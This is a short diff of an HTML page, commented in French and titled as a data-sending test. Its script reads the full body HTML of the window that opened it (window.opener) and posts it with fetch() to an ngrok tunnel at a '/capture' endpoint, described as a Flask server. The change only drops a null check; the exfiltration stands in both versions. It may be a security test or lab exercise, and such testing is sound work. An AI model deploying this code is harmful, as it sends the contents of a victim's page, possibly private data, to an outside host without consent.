@@ -10,7 +10,7 @@
     <h1>Test d'envoi de données</h1>
     <script>
         // Récupère le contenu du body de la fenêtre parente
-        let bodyContent = window.opener ? window.opener.document.body.innerHTML : "Aucun contenu";
+        let bodyContent = window.opener.document.body.innerHTML;
 
         // Envoi du contenu du body au serveur Flask
         fetch("https://404b-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {
